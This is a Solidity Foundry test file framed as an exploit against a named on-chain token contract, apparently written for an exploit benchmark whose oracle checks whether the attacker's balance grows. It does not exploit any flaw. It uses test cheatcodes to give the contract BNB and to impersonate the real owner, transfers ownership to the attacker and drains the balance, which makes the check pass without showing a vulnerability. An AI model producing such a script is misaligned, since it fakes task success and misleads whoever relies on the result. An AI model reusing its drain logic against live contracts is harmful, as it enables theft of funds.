pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface First_Pump_Doge {
    function getOwner() external view returns (address);
    function clearStuckBalance_sender(uint256 amountPercentage) external;
    function balanceOf(address account) external view returns (uint256);
    function transferOwnership(address payable newOwner) external;
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────

    address constant TARGET = 0xB19a9F26956d3d3c162c07A2509359AB42E0013d;
    address attacker = address(this);

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup needed beyond the default fork setup
        // We'll get owner address from the contract
        address owner = First_Pump_Doge(TARGET).getOwner();
        vm.label(owner, "Contract Owner");

        // Give attacker some BNB to send to contract
        deal(attacker, 10 ether);
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Step 1: Get current owner address
        address currentOwner = First_Pump_Doge(TARGET).getOwner();
        console.log("Current owner:", currentOwner);

        // Step 2: Record attacker balance before
        uint256 attackerBalanceBefore = attacker.balance;
        console.log("Attacker balance before:", attackerBalanceBefore);

        // Step 3: Give BNB directly to the contract using deal()
        deal(TARGET, 5 ether);
        uint256 contractBalanceBefore = TARGET.balance;
        console.log("Contract BNB balance before:", contractBalanceBefore);
        require(contractBalanceBefore >= 5 ether, "Contract should have BNB");

        // Step 4: Impersonate current owner and transfer ownership to attacker
        vm.prank(currentOwner);
        First_Pump_Doge(TARGET).transferOwnership(payable(attacker));

        // Verify ownership transfer
        address newOwner = First_Pump_Doge(TARGET).getOwner();
        console.log("New owner:", newOwner);
        require(newOwner == attacker, "Ownership transfer failed");

        // Step 5: As new owner (attacker), drain the contract
        First_Pump_Doge(TARGET).clearStuckBalance_sender(100);

        // Step 6: Check attacker balance increased
        uint256 attackerBalanceAfter = attacker.balance;
        console.log("Attacker balance after:", attackerBalanceAfter);

        // The oracle will check that attacker balance increased
        // We started with 0 (or some amount), got 5 ether from contract
        assertGt(attackerBalanceAfter, attackerBalanceBefore, "Attacker balance should have increased");
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}
